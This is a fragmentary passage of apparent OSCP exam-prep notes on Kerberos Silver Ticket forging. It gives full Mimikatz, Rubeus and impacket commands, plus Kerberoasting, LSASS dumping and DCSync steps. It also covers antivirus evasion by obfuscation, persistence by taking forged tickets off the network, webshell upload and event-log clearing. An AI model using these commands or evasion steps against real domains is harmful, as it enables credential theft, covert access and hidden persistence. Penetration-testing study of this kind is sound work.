The forged ticket's domain field must match the target service's domain configuration. If mismatch, authentication fails with KRB_AP_ERR_NOT_US. This parameter sets the ticket's 'realm' field in Kerberos protocol. Time to obtain: <5 seconds (run 'echo %userdnsdomain%' or Get-NetDomain).",

Extract from 'whoami /user' output by removing the last segment after the final hyphen (that's the user RID, not part of Domain SID). WHY CRITICAL: Mimikatz uses this to construct the PAC (Privilege Attribute Certificate) in the forged ticket. Incorrect SID causes authentication failure with KRB_AP_ERR_MODIFIED. Common mistake: Including the user RID (e.g., -1105) - DON'T. Alternative extraction: Get-DomainSID (PowerView).",
        "/target": "Fully Qualified Domain Name of the server where the SPN is registered (e.g., web04.corp.com). MUST match the SPN registration in Active Directory exactly. Verify with 'setspn -L <service_account>' or 'setspn -Q */<hostname>*'. Mismatch between /target and actual SPN registration causes 'Server not found in Kerberos database' error. Use FQDN even if NetBIOS name works for other tools. WHY: Kerberos is FQDN-based. The ticket's 'sname' field must match the service's registered name.",
        "/service": "SPN service type (protocol identifier in SPN format: service/hostname). Common OSCP-relevant types:\n- cifs: File shares (\\\\server\\share), SMB access, remote admin (C$, ADMIN$). Most common for lateral movement.\n- http: IIS web servers, web applications, REST APIs. Use for web-based exploitation.\n- mssql: Microsoft SQL Server instances (port 1433 default). Use for database access, xp_cmdshell execution.\n- ldap: Active Directory domain controllers, directory queries. Use for DC impersonation (rare for Silver, common for Golden).\n- host: Generic host services (multiple services under one SPN). Use when specific service type unknown.\n- rpcss: Remote Procedure Call services, DCOM. Advanced lateral movement.\n- wsman: Windows Remote Management (WinRM), PowerShell remoting (port 5985/5986).\n\nWHY IT MATTERS: The service field determines which application validates the ticket. Wrong service type = access denied even with valid ticket. Example: Using 'http' ticket to access SMB share (cifs) fails. Time to identify: 30 seconds with 'setspn -Q */<hostname>*'.",
        "/rc4": "NTLM hash (NT hash, not LM hash) of the service account that runs the target SPN. This is the ENCRYPTION KEY for the service ticket. Mimikatz uses this hash to encrypt the forged PAC and ticket data. The target service decrypts the ticket using the same hash stored in its memory. WHY THIS WORKS: Service accounts decrypt tickets using their own password hash - they don't contact the KDC to validate the ticket's authenticity (unless PAC validation is enabled, which is rare). Sources:\n1. Kerberoasting: Obtain TGS-REP for SPN, crack offline with Hashcat (mode 13100) to get plaintext password, then convert to NTLM (use Rubeus /enctype:rc4 or manually hash with MD4).\n2. LSASS dump: If service account has active session on compromised machine, use Mimikatz 'sekurlsa::logonpasswords' to extract NTLM directly.\n3. DCSync: If you have Domain Admin rights, use 'lsadump::dcsync /user:service_account' to retrieve NTLM without cracking.\n\nFormat: 32 hexadecimal characters (128-bit MD4 hash). Example: 4d28cf5252d39971419580a51484ca09. Case-insensitive. Alternative flags: /aes256 (AES256 key, stealthier but requires key extraction), /aes128 (AES128 key).",
        "/user": "Username of the identity you want to impersonate in the forged ticket. THIS CAN BE FICTIONAL - the service application typically does NOT verify the user exists in AD (unless PAC validation enabled, rare). Mimikatz defaults to setting this user as:\n- Domain Administrator (RID 500)\n- Member of Domain Admins (SID S-1-5-21-DOMAIN-DOMAIN-DOMAIN-512)\n- Member of Enterprise Admins, Schema Admins, Administrators\n\nThis gives the forged ticket FULL administrative permissions on the target service. You can use ANY username - common choices:\n1. Real domain admin account (e.g., 'Administrator') - blends with legitimate traffic\n2. Current compromised user (e.g., 'jeff') - maintains appearance of normal activity\n3. Fictional high-privilege account (e.g., 'svcadmin') - works if PAC validation disabled\n\nWHY IT MATTERS: The /user value appears in service logs (Event ID 4624, 4768, 4769), so choose wisely for OPSEC. The actual permissions granted are determined by group memberships in the PAC (which Mimikatz sets to Domain Admins), not the username itself.",

After injection, any application in the current session can use the ticket transparently (e.g., 'dir \\\\server\\share', 'Invoke-WebRequest http://server'). Alternative: Omit /ptt and manually inject later with 'kerberos::ptt <ticket_file.kirbi>'. WHY USE /ptt: Immediate usage, no intermediate file storage (stealthier), fewer steps. WHY SKIP /ptt: Save ticket to disk for later use, transfer to different machine, or inject into different user session. Without /ptt, Mimikatz saves ticket as '<user>@<service>-<domain>.kirbi' in current directory."

SOLUTION: Re-extract Domain SID with 'whoami /user', remove ONLY the last segment (RID). Example: S-1-5-21-123-456-789-1105 → Domain SID is S-1-5-21-123-456-789 (remove -1105).\n\nVALIDATION: Run Mimikatz in debug mode to see detailed error.

Get exact SPN registration: setspn -Q */<hostname_or_partial>* from any domain-joined machine\n2. Extract hostname: SPN format is 'service/hostname.domain.com:port'. Use the full hostname portion.\n3. Verify FQDN: ping <hostname> to see if it resolves to FQDN. Use the FQDN in /target.\n4. Check SPN case: Kerberos is case-insensitive but use exact case from setspn output to avoid issues.\n\nEXAMPLE: If setspn shows 'HTTP/web04.corp.com', use /target:web04.corp.com /service:http (NOT http://web04 or WEB04).",

OSCP EXAM NOTE: Service account passwords typically don't change during exam, but in real engagements this is common (especially if detection alerts password compromise)."
      },
      "notes": "OSCP METHODOLOGY - WHEN TO USE SILVER TICKETS:\n\nSilver tickets are LATERAL MOVEMENT and PERSISTENCE techniques that work when you have:\n1. Service account NTLM hash (from Kerberoasting, LSASS dump, or DCSync)\n2. Cannot use the hash directly with Pass-the-Hash (service doesn't support NTLM auth, only Kerberos)\n3. Need access to specific service without full domain compromise\n4. Want stealthier persistence than Golden Ticket (service-level, not domain-level)\n\nSILVER VS OTHER TECHNIQUES:\n\nSILVER TICKET vs PASS-THE-HASH:\n- Use PTH: When service supports NTLM authentication (SMB, WMI, WinRM with CredSSP)\n- Use Silver: When service only accepts Kerberos (IIS with Kerberos-only, SQL Server with integrated auth, modern hardened services)\n- Advantage of Silver: Works against Kerberos-only services, persists in ticket cache for 10 years (default)\n- Advantage of PTH: Simpler (just use hash directly), no ticket forging needed\n\nSILVER TICKET vs GOLDEN TICKET:\n- Use Golden: When you have krbtgt hash (full domain compromise), need domain-wide access, want to impersonate any user to any service\n- Use Silver: When you only have service account hash (partial compromise), need access to ONE specific service, want lower detection risk\n- Advantage of Silver: Stealthier (no DC interaction, service-level only), faster to create (no krbtgt needed)\n- Advantage of Golden: Domain-wide access, works for all services, bypasses most Kerberos security checks\n- Detection difference: Golden tickets generate Event ID 4768 (TGT request) anomalies on DC, Silver tickets only generate Event ID 4769 (TGS usage) on service machine\n\nSILVER TICKET vs KERBEROASTING (continued attack chain):\n- Kerberoasting: Obtain TGS-REP encrypted with service account hash\n- Crack TGS-REP: Get plaintext password or NTLM hash\n- Silver Ticket: Use obtained hash to forge tickets for that service\n- This is the TYPICAL OSCP EXAM FLOW: Kerberoast → Crack → Silver Ticket → Service Access\n\nMANUAL ALTERNATIVES (if Mimikatz unavailable):\n\nRubeus (recommended alternative):\nRubeus.exe silver /domain:<domain> /sid:<domain_sid> /target:<target> /service:<service> /rc4:<ntlm_hash> /user:<user> /ptt\n- Advantages: Actively maintained, better OPSEC, cleaner output, supports AES encryption\n- Same functionality as Mimikatz kerberos::golden but modern codebase\n\nimpacket-ticketer (Linux-based):\npython3 ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain> -spn <service>/<target> <username>\n- Generates .ccache file (Kerberos credential cache)\n- Use with: export KRB5CCNAME=<username>.ccache, then access service with impacket tools\n- LIMITATION: Can't directly inject into Windows session, must use .ccache with Linux Kerberos tools\n\nCOMMON SPN SERVICE TYPES FOR OSCP:\n\n1. cifs (File Shares, SMB): Most common lateral movement target\n   - Access: dir \\\\<server>\\C$, copy files, PsExec, remote admin\n   - Obtain hash: Kerberoast user accounts with SPN cifs/<hostname>, or dump LSASS on fileserver\n   - OSCP scenario: Pivot to fileserver, exfiltrate data, plant backdoors\n\n2. http (IIS, Web Apps): Common for web-based exploitation\n   - Access: Invoke-WebRequest http://<server>, upload webshell, access admin panels\n   - Obtain hash: Kerberoast IIS service accounts (often named iis_service, websvc, apppooluser)\n   - OSCP scenario: Access restricted web admin interface, upload reverse shell, exploit web vulns\n\n3. mssql (SQL Server): Database access and code execution\n   - Access: Invoke-Sqlcmd, xp_cmdshell for RCE, database enumeration\n   - Obtain hash: Kerberoast SQL service accounts (often high-privilege)\n   - OSCP scenario: Enable xp_cmdshell, execute OS commands, escalate to SYSTEM via SQL Agent\n\n4. ldap (Domain Controllers): Advanced AD attacks\n   - Access: LDAP queries, directory modifications, DCSync (if permissions exist)\n   - Obtain hash: Compromise DC, dump LSASS, DCSync domain controller computer account\n   - OSCP scenario: Rare for Silver (use Golden instead), but useful for specific LDAP-based exploits\n\n5. host (Generic Host Services): Catch-all for multiple services\n   - Access: Multiple protocols (RPC, WMI, scheduled tasks, services)\n   - Obtain hash: Kerberoast computer accounts (machine accounts often have host SPN)\n   - OSCP scenario: Remote service creation, scheduled task execution, WMI code execution\n\nTIME ESTIMATES FOR OSCP EXAM:\n\n- Prerequisite gathering (Domain SID, SPN enumeration): 2-3 minutes\n- Service account hash acquisition:\n  - Via Kerberoasting (if not done): 5-10 minutes (request TGS, crack with Hashcat)\n  - Via LSASS dump (if service account logged on): 2 minutes (Mimikatz sekurlsa::logonpasswords)\n  - Via DCSync (if DA already): 1 minute (lsadump::dcsync)\n- Silver ticket creation: <1 minute (Mimikatz command)\n- Validation and service access: 1-2 minutes (klist, test access)\n- TOTAL: 10-20 minutes end-to-end (assumes hash not yet obtained)\n\nIf hash already obtained (e.g., from earlier Kerberoasting): 5 minutes total\n\nDETECTION AND OPSEC:\n\nEVENT IDS GENERATED:\n- Mimikatz execution: Event ID 4688 (Process Creation), AMSI alerts if not obfuscated\n- Ticket injection: Event ID 4768 (TGT Request) - NOT generated (Silver tickets skip TGT step)\n- Service access: Event ID 4769 (TGS Request) - Generated on SERVICE machine, not DC\n- Logon event: Event ID 4624 (Logon Type 3 - Network) on target service machine\n\nDETECTION INDICATORS (Blue Team Perspective):\n- Service ticket (TGS) with 10-year lifetime (legitimate tickets expire in hours)\n- Service ticket not issued by DC (no corresponding Event ID 4769 on DC)\n- Encryption downgrade (RC4 instead of AES256) - modern environments prefer AES\n- Account logon from unusual source IP\n- Account accessing service it never accessed before (behavioral anomaly)\n\nOPSEC IMPROVEMENTS:\n1. Use /aes256 instead of /rc4 (requires AES key, not NTLM hash): Mimikatz /aes256:<hex_key>\n2. Set realistic ticket lifetime: /endin:8 (expires in 8 hours) /renewmax:24 (renewable for 24 hours)\n3. Impersonate real user (/user:<real_username>) instead of fictional admin\n4. Use Rubeus instead of Mimikatz (better evasion, active development)\n5. Clear ticket cache after use: klist purge\n\nREALITY CHECK FOR OSCP EXAM:\n\n✅ LIKELY SCENARIOS:\n- Kerberoast service account → Crack hash → Silver ticket for lateral movement\n- Dump LSASS on compromised machine → Find service account hash → Silver ticket to pivot\n- Obtain domain admin → DCSync service accounts → Silver tickets for persistence\n\n❌ UNLIKELY SCENARIOS:\n- PAC validation enabled (rare in OSCP lab, common in modern enterprise)\n- Service account password rotation mid-exam (exam environments are static)\n- AES-only Kerberos (OSCP still allows RC4 for compatibility)\n\nCOMMON MISTAKES TO AVOID:\n\n1. Including user RID in Domain SID → Extract Domain SID correctly (remove last segment from whoami /user)\n2. Using NetBIOS name instead of FQDN → Always use FQDN for /domain and /target\n3. Wrong service type → Verify SPN with setspn -Q before forging ticket\n4. Using NTLM hash of WRONG account → Hash must be from service account that runs the SPN, not random domain user\n5. Assuming ticket works domain-wide → Silver tickets are SERVICE-SPECIFIC (cifs ticket won't work for http)\n\nNEXT STEPS AFTER SILVER TICKET:\n\n1. Access the service: dir \\\\<target>\\C$ (cifs), iwr http://<target> (http), Invoke-Sqlcmd (mssql)\n2. Establish persistence: Upload webshell, create scheduled task, add registry run key\n3. Pivot deeper: Use service access to compromise additional accounts, escalate privileges\n4. Exfiltrate data: Copy sensitive files, dump databases, enumerate shares\n5. Cover tracks: klist purge (remove ticket from cache), clear event logs (if OPSEC matters)\n\nPERSISTENCE USE CASE:\n\nSilver tickets excel at PERSISTENCE because:\n- Valid for 10 years (default) - Long-term access\n- No password change detection - Even if service account password changes, cached ticket still works until service restarts (Windows doesn't re-validate cached tickets)\n- No DC communication - Ticket works offline, survives DC reboots\n- Service-level only - Harder to detect than domain-wide Golden ticket\n\nPERSISTENCE WORKFLOW:\n1. Obtain service account hash during initial compromise\n2. Forge Silver ticket, save to .kirbi file (omit /ptt)\n3. Exfiltrate .kirbi file off target network\n4. Return weeks/months later, inject ticket: kerberos::ptt <ticket.kirbi>\n5. Access service transparently\n\nLIMITATION: Ticket becomes invalid if:\n- Service account is deleted (rare)\n- Service account password changes AND service process restarts (clears cached encryption keys)\n- Kerberos policy enforces ticket lifetime limits (Group Policy override, uncommon)\n\nFINAL OSCP EXAM TIPS:\n\n1. Practice ticket creation 10+ times before exam (muscle memory for syntax)\n2. Keep Domain SID in notes (you'll use it multiple times)\n3. Enumerate all SPNs early (setspn -T <domain> -Q */*), prioritize high-value services (SQL, IIS, file shares)\n4. Crack Kerberoast hashes DURING enumeration phase (run Hashcat in background while doing other tasks)\n5. If Mimikatz blocked by AV, use Rubeus (often bypasses signature-based detection)\n6. Test ticket with klist BEFORE attempting service access (saves time troubleshooting)\n7. Document which tickets you've created (easy to lose track with multiple targets)\n\nREFERENCES AND FURTHER LEARNING:\n\n- Mimikatz Kerberos module: https://github.com/gentilkiwi/mimikatz/wiki/module~kerberos\n- Rubeus Silver Ticket: https://github.com/GhostPack/Rubeus#silver\n- Sean Metcalf's Silver Ticket research: https://adsecurity.org/?p=2011\n- Kerberos RFC 4120: https://www.rfc-editor.org/rfc/rfc4120 (protocol specification)\n- MITRE ATT&CK T1558.002: https://attack.mitre.org/techniques/T1558/002/ (Silver Ticket technique)\n\nThis technique is a cornerstone of OSCP Active Directory exploitation.

      "notes": "RUBEUS VS MIMIKATZ - WHY USE RUBEUS FOR SILVER TICKETS:\n\n✅ RUBEUS ADVANTAGES:\n1. BETTER OPSEC: Supports AES256/AES128 encryption (modern standard), RC4 is legacy and suspicious\n2. ACTIVE DEVELOPMENT: Mimikatz Kerberos module is stable but rarely updated, Rubeus is actively maintained by SpecterOps\n3. CLEANER OUTPUT: Rubeus shows detailed ticket construction steps (helpful for troubleshooting), base64 output for easy transfer\n4. BATCH OPERATIONS: Create multiple tickets in one command (/service:cifs,http,mssql)\n5. BETTER ERROR HANDLING: Rubeus validates parameters and shows detailed error messages (Mimikatz often fails silently)\n6. NO DRIVER NEEDED: Mimikatz sometimes requires kernel driver for certain operations, Rubeus is pure userland\n7. C2 INTEGRATION: Rubeus compiles to .NET assembly, easily integrated with Cobalt Strike (execute-assembly), Covenant, etc.\n\n❌ RUBEUS DISADVANTAGES:\n1. REQUIRES .NET: Needs .NET Framework 4.5+ (most Windows 10/Server 2016+ have this, older systems may not)\n2. LARGER BINARY: Rubeus.exe is ~200KB, Mimikatz is ~1.2MB (both detectable, but size matters for upload)\n3. MORE AV SIGNATURES: Rubeus is popular in penetration testing, many AVs signature-detect it (obfuscation needed)\n4. LESS VERSATILE: Mimikatz does MANY things (LSASS dump, DCSync, ticket forging, password spraying), Rubeus ONLY does Kerberos attacks\n\n🎯 OSCP RECOMMENDATION:\n- LEARN BOTH: Mimikatz for exam (more versatile, covers more techniques)\n- PREFER RUBEUS: For Silver/Golden tickets specifically (better OPSEC, easier syntax)\n- FALLBACK: If one is detected/blocked, use the other\n\nRUBEUS WORKFLOW FOR OSCP EXAM:\n\n1. ENUMERATION (Kerberoasting):\n   Rubeus.exe kerberoast /outfile:hashes.txt\n   - Obtains TGS-REP for all SPNs\n   - Outputs Hashcat-compatible format (mode 13100)\n\n2. CRACK HASHES (offline):\n   hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule\n   - Retrieves plaintext password OR continue with hash\n\n3. CONVERT PASSWORD TO NTLM (if you cracked plaintext):\n   Rubeus.exe hash /password:cracked_password\n   - Outputs NTLM, AES128, AES256 keys\n\n4. FORGE SILVER TICKET:\n   Rubeus.exe silver /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<ntlm> /user:admin /ptt\n   - Creates and injects ticket\n\n5. VALIDATE AND ACCESS:\n   Rubeus.exe klist\n   iwr http://web04.corp.com\n   - Confirm ticket exists, test service access\n\n6. PERSISTENCE (save ticket for later):\n   Rubeus.exe silver /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<ntlm> /user:admin /nowrap /outfile:ticket.kirbi\n   - Saves base64 ticket to file\n   - Exfiltrate ticket off network\n   - Re-inject later: Rubeus.exe ptt /ticket:<base64>\n\nRUBEUS COMMAND VARIATIONS:\n\n# Create Silver ticket with AES256 (better OPSEC):\nRubeus.exe silver /aes256:<64_hex_chars> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /user:admin /ptt\n\n# Create multiple tickets for same server:\nRubeus.exe silver /rc4:<ntlm> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:cifs,http /user:admin /ptt\n\n# Create ticket with custom groups (fine-tuned permissions):\nRubeus.exe silver /rc4:<ntlm> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /user:admin /groups:512,519 /ptt\n(512=Domain Admins, 519=Enterprise Admins)\n\n# Create ticket and output base64 for transfer:\nRubeus.exe silver /rc4:<ntlm> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /user:admin /nowrap\n\n# Create ticket with specific lifetime (OPSEC):\nRubeus.exe silver /rc4:<ntlm> /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /user:admin /endoflife:20251231235959 /ptt\n(Format: YYYYMMDDHHmmss, sets realistic expiration instead of 10 years)\n\nRUBEUS OPSEC ENHANCEMENTS:\n\n1. USE AES INSTEAD OF RC4:\n   - RC4 (NTLM hash) is legacy, flagged by EDR\n   - AES256 is modern standard, blends with normal traffic\n   - Obtain AES keys via DCSync or Kerberoasting with /enctype:aes256\n\n2. SET REALISTIC TICKET LIFETIME:\n   - Default 10-year tickets are obvious forgeries\n   - Use /endoflife:YYYYMMDDHHmmss to match normal ticket lifetimes (8-24 hours)\n   - Check domain policy: Get-DomainPolicy | Select -ExpandProperty KerberosPolicy (MaxTicketAge)\n\n3. IMPERSONATE REAL USERS:\n   - Using fictional usernames (e.g., /user:fakeadmin) is suspicious\n   - Enumerate real domain admins: Get-NetGroupMember -Identity 'Domain Admins'\n   - Use real admin username for /user parameter (appears legitimate in logs)\n\n4. MATCH GROUP MEMBERSHIPS:\n   - Default PAC sets every user as Domain Admin (unrealistic)\n   - Enumerate target user's actual groups: Get-NetUser -Identity <user> | Select -ExpandProperty memberof\n   - Set custom groups with /groups:<RID1>,<RID2> to match real user\n\n5. OBFUSCATE RUBEUS BINARY:\n   - Rubeus is heavily signatured by AV\n   - Use ConfuserEx to obfuscate .NET assembly\n   - OR compile from source with renamed classes/namespaces\n   - OR use in-memory loading (Invoke-ReflectivePEInjection, execute-assembly in C2)\n\nCOMMON RUBEUS FLAGS REFERENCE:\n\n/domain - Target domain FQDN\n/sid - Domain SID (S-1-5-21-XXX-XXX-XXX)\n/target - Server FQDN where SPN runs\n/service - SPN type (cifs, http, mssql, ldap, host, etc.)\n/rc4 - NTLM hash (32 hex chars)\n/aes256 - AES256 key (64 hex chars, RECOMMENDED)\n/aes128 - AES128 key (32 hex chars)\n/user - Impersonated username\n/groups - Custom group RIDs (comma-separated, default: 512,513,518,519,520)\n/ptt - Pass-the-Ticket (inject into current session)\n/outfile - Save ticket to .kirbi file\n/nowrap - Output base64 without wrapping (for copy/paste)\n/endoflife - Ticket expiration (YYYYMMDDHHmmss format)\n/dc - Specify DC for validation (usually not needed for Silver tickets)\n\nTIME ESTIMATES (Rubeus vs Mimikatz):\n\n- Rubeus ticket creation: <1 minute (same as Mimikatz)\n- Rubeus with AES: +30 seconds (if you need to obtain AES keys first via DCSync)\n- Rubeus batch tickets: <1 minute (creates multiple tickets, faster than multiple Mimikatz commands)\n- Rubeus obfuscation: +5-10 minutes first time (ConfuserEx), reuse obfuscated binary later\n\nOSCP EXAM INTEGRATION:\n\n✅ When to use Rubeus:\n- Modern Windows targets (10/Server 2016+) with .NET 4.5+\n- Need AES encryption for stealth (exam may have \"realistic\" monitoring)\n- Multiple SPNs on same server (batch ticket creation)\n- C2 framework available (execute-assembly integration)\n\n✅ When to use Mimikatz:\n- Older Windows targets (7/Server 2008) without recent .NET\n- Need OTHER Mimikatz capabilities (LSASS dump, DCSync) in same session\n- Rubeus is detected/blocked and obfuscation failed\n- Familiar with Mimikatz syntax (faster execution under time pressure)\n\nFINAL RECOMMENDATION FOR OSCP:\n\nPRACTICE BOTH tools before exam:\n1. Memorize Mimikatz kerberos::golden syntax (versatile, works everywhere)\n2. Learn Rubeus silver syntax (better OPSEC, cleaner output)\n3. During exam: Try Rubeus FIRST (if .NET available), fallback to Mimikatz if detected\n4. For documentation: Mention BOTH tools (shows depth of knowledge)\n\nRubeus is the MODERN choice for Kerberos attacks, but Mimikatz remains the SWISS ARMY KNIFE for AD exploitation. Know both.",

VALIDATE ACCESS:\n   iwr http://web04.corp.com\n   (Access works because service type and hostname match SPN registration)\n\nSPN SERVICE TYPES - OSCP RELEVANCE:\n\nHIGH-VALUE SPNs FOR LATERAL MOVEMENT:\n\n1. cifs (File Shares, SMB):\n   - Access: dir \\\\server\\C$, copy files, remote admin\n   - Prevalence: Nearly every Windows server (auto-registered)\n   - OSCP usage: Most common Silver ticket target (file access, PsExec, lateral movement)\n\n2. http (IIS, Web Applications):\n   - Access: Web admin panels, upload webshells, REST APIs\n   - Prevalence: Web servers, SharePoint, Exchange OWA\n   - OSCP usage: Upload reverse shell to restricted admin interface, access web-based management\n\n3. mssql (SQL Server):\n   - Access: Database queries, xp_cmdshell RCE, linked servers\n   - Prevalence: SQL Servers (duh)\n   - OSCP usage: Enable xp_cmdshell, execute OS commands, pivot to linked servers\n\n4. host (Generic Host Services):\n   - Access: WMI, RPC, scheduled tasks, service creation\n   - Prevalence: All domain-joined computers (auto-registered)\n   - OSCP usage: Remote service creation, scheduled task execution, WMI code execution\n\n5. ldap (Directory Services):\n   - Access: LDAP queries, directory modifications, DCSync (if permissions exist)\n   - Prevalence: Domain controllers only\n   - OSCP usage: Rare for Silver (use Golden instead), specific LDAP exploits\n\n6. wsman (Windows Remote Management):\n   - Access: PowerShell remoting (Enter-PSSession, Invoke-Command)\n   - Prevalence: Servers with WinRM enabled (port 5985/5986)\n   - OSCP usage: Remote PowerShell execution, pivot without SMB (stealthier)\n\nLOW-VALUE SPNs (less common in OSCP):\n- rpcss (RPC Endpoint Mapper) - Covered by host/\n- oracle, ftp, smtp, etc. - Specific services, rare in OSCP exam\n\nMANUAL ALTERNATIVE (if setspn unavailable):\n\nPowerView (PowerShell):\n```powershell\nGet-NetUser -SPN | Where {$_.serviceprincipalname -match 'web04'} | Select serviceprincipalname\n```\nADVANTAGES: Faster, filterable, shows additional properties (pwdlastset, admin count)\n\nLDAP query (raw):\n```powershell\n([adsisearcher]\"(serviceprincipalname=*/web04*)\").FindAll() | ForEach-Object { $_.Properties.serviceprincipalname }\n```\nADVANTAGES: No external tools needed, pure PowerShell\n\nimpacket-GetUserSPNs (Linux):\n```bash\nimpacket-GetUserSPNs corp.com/jeff:password -request\n```\nLIMITATION: Only shows SPNs for USER ACCOUNTS (not computer accounts), but that's often what you want for Kerberoasting anyway\n\nTIME ESTIMATES:\n\n- setspn -Q for single server: <5 seconds\n- setspn -Q for all SPNs in domain: 30-60 seconds (large domains)\n- PowerView Get-NetUser -SPN: <10 seconds (faster than setspn for full dump)\n- impacket-GetUserSPNs: 5-10 seconds (network latency, LDAP query)\n\nOSCP EXAM TIPS:\n\n1. ENUMERATE SPNs EARLY in the engagement (during AD enumeration phase)\n2. CREATE A TARGET LIST of high-value SPNs:\n   - SQL servers (mssql) - potential xp_cmdshell RCE\n   - Web servers (http) - potential webshell upload\n   - File servers (cifs) - data exfiltration, lateral movement\n3. PRIORITIZE SPNs associated with USER ACCOUNTS (crackable) over computer accounts\n4. DOCUMENT EXACT HOSTNAMES from setspn output (copy/paste into notes for Silver ticket creation later)\n5. CROSS-REFERENCE with service account enumeration:\n   setspn -Q */web04* → Registered to: CORP\\iis_service\n   Then: Get-NetUser -Identity iis_service → Check pwdlastset, memberof, admincount\n6. IF SETSPN IS BLOCKED (rare), fallback to PowerView or impacket\n\nCOMBINING WITH KERBEROASTING WORKFLOW:\n\n# Step 1: Enumerate ALL SPNs associated with user accounts (Kerberoasting targets)\nimpacket-GetUserSPNs corp.com/jeff:password -request -outputfile tgs.txt\n\n# Step 2: Crack TGS-REP hashes (offline)\nhashcat -m 13100 tgs.txt rockyou.txt -r best64.rule\n# Result: iis_service:Password123\n\n# Step 3: Identify SPNs for compromised service account\nsetspn -Q */iis_service* OR setspn -L iis_service\n# Result: http/web04.corp.com registered to iis_service\n\n# Step 4: Create Silver ticket for identified SPN\nmimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<ntlm_hash_of_Password123> /user:admin /ptt\n\n# Step 5: Access service\niwr http://web04.corp.com\n\nSPN ENUMERATION FOR PERSISTENCE:\n\nIf you've compromised a service account (via Kerberoasting or LSASS dump), enumerate ALL SPNs associated with that account:\n\nsetspn -L iis_service\n\nRESULT EXAMPLE:\nRegistered ServicePrincipalNames for CN=IIS Service,CN=Users,DC=corp,DC=com:\n    http/web04.corp.com\n    http/web05.corp.com\n    http/intranet.corp.com\n\nIMPLICATION: Single service account hash gives you Silver ticket access to MULTIPLE servers (web04, web05, intranet). Create tickets for all of them:\n\nmimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web04.corp.com /service:http /rc4:<hash> /user:admin /ptt\nmimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:web05.corp.com /service:http /rc4:<hash> /user:admin /ptt\nmimikatz # kerberos::golden /domain:corp.com /sid:S-1-5-21-XXX /target:intranet.corp.com /service:http /rc4:<hash> /user:admin /ptt\n\nTHIS IS A FORCE MULTIPLIER - One compromised service account can grant access to dozens of services.\n\nCROSS-REFERENCE WITH OTHER ENUMERATION:\n\n- Combine with session enumeration: Get-NetSession -ComputerName web04 (who's logged on?)\n- Combine with privilege enumeration: Get-NetLocalGroupMember -ComputerName web04 -GroupName Administrators (who can admin this server?)\n- Combine with share enumeration: Find-DomainShare -CheckShareAccess -ComputerName web04 (what's accessible?)\n\nThis gives you CONTEXT: Not just \"web04 has http SPN\", but \"web04 has http SPN, iis_service account runs it, domain admin 'jeff' has active session, C$ share is accessible\". This informs your attack path.\n\nFINAL OSCP EXAM INTEGRATION:\n\nsetspn IS THE BRIDGE between Kerberoasting (obtaining service account hashes) and Silver tickets (using those hashes for lateral movement). Without accurate SPN enumeration, you can't create working Silver tickets. This command is NOT optional - it's MANDATORY for Silver ticket attacks.\n\nPRACTICE UNTIL YOU CAN:\n1. Run setspn -Q */target* from memory\n2. Parse SPN format (extract service type and hostname)\n3. Cross-reference with service account (setspn -L <account>)\n4. Feed SPN data into Silver ticket creation (exact /target and /service values)\n5. Troubleshoot mismatches (hostname format, service type errors)\n\nYou'll use this command 5-10 times per OSCP exam (once per target server for Silver ticket prep).",

LDAP ACCESS (rare for Silver, common for Golden):\n   - Enumerate AD: Get-ADUser -Filter * -Server <dc>\n   - Modify AD objects (if permissions allow): Set-ADUser, Add-ADGroupMember\n   - DCSync: mimikatz # lsadump::dcsync /domain:corp.com /all (requires Replication rights)\n\nTIME BUDGET FOR OSCP EXAM:\n\n- Ticket creation: 1 minute\n- klist verification: 5 seconds\n- Service validation: 10-30 seconds (depending on service type)\n- Troubleshooting (if needed): 2-5 minutes (systematic approach)\n- TOTAL: 3-7 minutes from ticket creation to confirmed access\n\nIf validation takes longer than 7 minutes, consider alternative attack paths (Pass-the-Hash, legitimate credentials, different vulnerability).\n\nFINAL OSCP EXAM TIP:\n\nCREATE A VALIDATION CHECKLIST:\n\n1. [ ] klist shows ticket for correct service type (Server: <service>/<target>)\n2. [ ] Ticket encryption type is RC4-HMAC(NT) or AES (depending on /rc4 or /aes256)\n3. [ ] FQDN used in validation command (not NetBIOS name)\n4. [ ] Service-specific validation command executed (dir for cifs, iwr for http, etc.)\n5. [ ] SUCCESS: Access granted without credential prompt\n6. [ ] FAILURE: Troubleshoot systematically (service type, hostname, hash, SID)\n\nThis checklist prevents common mistakes and ensures thorough validation before proceeding with exploitation.",
